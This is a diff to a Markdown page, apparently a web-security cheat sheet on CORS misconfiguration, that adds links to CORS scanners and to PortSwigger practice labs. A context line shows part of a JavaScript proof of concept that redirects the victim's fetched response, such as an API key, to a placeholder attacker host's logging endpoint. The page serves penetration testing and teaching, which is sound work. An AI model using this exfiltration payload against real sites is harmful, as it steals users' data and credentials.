@@ -11,8 +11,10 @@
 
 ## Tools
 
-* [Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
+* [s0md3v/Corsy - CORS Misconfiguration Scanner](https://github.com/s0md3v/Corsy/)
+* [chenjj/CORScanner - Fast CORS misconfiguration vulnerabilities scanner](https://github.com/chenjj/CORScanner)
 * [PostMessage POC Builder - @honoki](https://tools.honoki.net/postmessage.html)
+
 
 ## Prerequisites
 
@@ -243,6 +245,13 @@ function reqListener() {
     location='//atttacker.net/log?key='+this.responseText; 
 };
 ```
+
+## Labs
+
+* [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
+* [CORS vulnerability with trusted null origin](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack)
+* [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+* [CORS vulnerability with internal network pivot attack](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack)
 
 ## Bug Bounty reports
 
